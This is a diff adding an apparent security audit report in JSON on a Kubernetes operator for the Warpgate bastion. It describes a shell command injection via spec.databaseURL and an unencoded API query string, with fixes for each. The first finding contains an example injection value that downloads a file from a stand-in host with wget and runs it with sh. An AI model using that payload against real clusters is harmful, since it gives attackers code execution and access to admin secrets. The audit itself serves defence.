@@ -1,0 +1,53 @@
+{
+  "summary": "Reviewed the warpgate-operator Go codebase (a Kubernetes operator that manages a Warpgate bastion via CRDs). Coverage focused on internal/ (controllers and the Warpgate REST client), cmd/main.go, and api/v1alpha1 (CRD types, admission webhooks). The operator's main trust boundary is the set of users with RBAC to create/edit the custom resources; the webhooks validate several fields but leave free-form strings unsanitized before they are embedded into a generated shell script, a YAML config file, and HTTP query strings. Overall risk is moderate: the most notable issue is OS command injection in the init-container script built from spec.databaseURL. No hardcoded secrets or broken cryptography were found (passwords use crypto/rand and are length-validated).",
+  "coverage": [
+    "cmd/main.go",
+    "internal/controller/helpers.go",
+    "internal/controller/warpgateinstance_controller.go",
+    "internal/controller/warpgateconnection_controller.go",
+    "internal/controller/warpgateticket_controller.go",
+    "internal/controller/warpgatepasswordcredential_controller.go",
+    "internal/controller/warpgateuser_controller.go",
+    "internal/controller/httproute_watcher_controller.go",
+    "internal/warpgate/client.go",
+    "internal/warpgate/credentials.go",
+    "internal/warpgate/user.go",
+    "internal/warpgate/target.go",
+    "internal/warpgate/role.go",
+    "internal/warpgate/bindings.go",
+    "internal/warpgate/parameters.go",
+    "internal/warpgate/ssh_keys.go",
+    "internal/warpgate/ticket.go",
+    "api/v1alpha1/warpgateinstance_webhook.go",
+    "api/v1alpha1/warpgateconnection_webhook.go",
+    "api/v1alpha1/warpgateuser_webhook.go"
+  ],
+  "findings": [
+    {
+      "title": "OS command injection via spec.databaseURL in WarpgateInstance init-container script",
+      "category": "security",
+      "cwe": "CWE-78",
+      "severity": "medium",
+      "confidence": "high",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 556,
+      "line_end": 558,
+      "description": "buildDeployment assembles a shell script from free-form WarpgateInstance spec fields and runs it with `/bin/sh -c` in the init container (Command: []string{\"/bin/sh\", \"-c\", initScript} at lines 773-776). The user-controlled field spec.databaseURL is concatenated into the `warpgate ... unattended-setup` command via fmt.Sprintf(` --database-url \"%s\"`, inst.Spec.DatabaseURL) with no escaping or validation. A databaseURL value such as `sqlite:/data/db\"; wget http://evil/x -O /tmp/x; sh /tmp/x; echo \"` breaks out of the quotes and executes arbitrary commands inside the Warpgate pod, which holds the admin password (mounted as $ADMIN_PASSWORD), the TLS private key, and the data PVC. Reachable by anyone with RBAC to create or update a WarpgateInstance; the validating webhook (api/v1alpha1/warpgateinstance_webhook.go validateWarpgateInstance) checks ports/version/storage but never inspects databaseURL. Although such a user can also set spec.image, this injection bypasses image-allowlist admission policies that only constrain the image. The same unsanitized fields are also injected into the generated warpgate.yaml: fmt.Fprintf(&b, \"database_url: \\\"%s\\\"\\n\", inst.Spec.DatabaseURL) at line 345 and the unquoted fmt.Fprintf(&b, \"external_host: %s\\n\", inst.Spec.ExternalHost) at line 380 allow config/YAML injection (CWE-94) with the same source and root cause.",
+      "evidence": "setupCmd := fmt.Sprintf(`warpgate --skip-securing-files unattended-setup --data-path /data --http-port %d --admin-password \"${ADMIN_PASSWORD}\"`, instanceHTTPPort(inst))\n...\nif inst.Spec.DatabaseURL != \"\" {\n    setupCmd += fmt.Sprintf(` --database-url \"%s\"`, inst.Spec.DatabaseURL)\n}\n...\nscriptParts = append(scriptParts, ..., fmt.Sprintf(\"  %s\", setupCmd), ...)\ninitScript := strings.Join(scriptParts, \"\\n\")\n// ...\nCommand: []string{\"/bin/sh\", \"-c\", initScript},",
+      "recommendation": "Do not build the setup command via string concatenation. Pass databaseURL (and other values) as separate argv elements instead of a `/bin/sh -c` string, or supply it via an environment variable referenced inside the script (like ADMIN_PASSWORD is) so the shell never re-parses it. Additionally, validate databaseURL and externalHost in the webhook against a strict allowlist/regex, and quote/escape values written into warpgate.yaml (e.g. marshal the config with a YAML encoder rather than fmt.Fprintf)."
+    },
+    {
+      "title": "Unencoded user-controlled search term injected into Warpgate API query string in ListUsers/ListTargets/ListRoles",
+      "category": "security",
+      "cwe": "CWE-88",
+      "severity": "low",
+      "confidence": "medium",
+      "file": "internal/warpgate/user.go",
+      "line_start": 81,
+      "line_end": 83,
+      "description": "ListUsers builds the request URL by concatenating the raw search term directly into the query string (`path += \"?search=\" + search`) without url.QueryEscape. The search value originates from CR spec fields (e.g. WarpgateUser.Spec.Username / WarpgatePasswordCredential.Spec.Username via GetUserByUsername -> ListUsers). A value containing `&`, `#`, or whitespace alters the request sent to the Warpgate admin API: `#` truncates the search, and `&param=value` injects additional query parameters into the admin endpoint. Practical impact is limited because callers re-filter the response for an exact match, and the request uses the operator's trusted credentials, so this is primarily request-shaping/robustness rather than a privilege crossing. The identical pattern exists at internal/warpgate/target.go:208 (ListTargets) and internal/warpgate/role.go:61 (ListRoles).",
+      "evidence": "func (c *Client) ListUsers(search string) ([]User, error) {\n    path := \"/users\"\n    if search != \"\" {\n        path += \"?search=\" + search\n    }\n    ... c.Get(path, &users) ...",
+      "recommendation": "URL-encode the value, e.g. build the query with net/url: `path += \"?search=\" + url.QueryEscape(search)` or construct a url.Values and call Encode(). Apply the same fix in ListTargets and ListRoles."
+    }
+  ]
+}
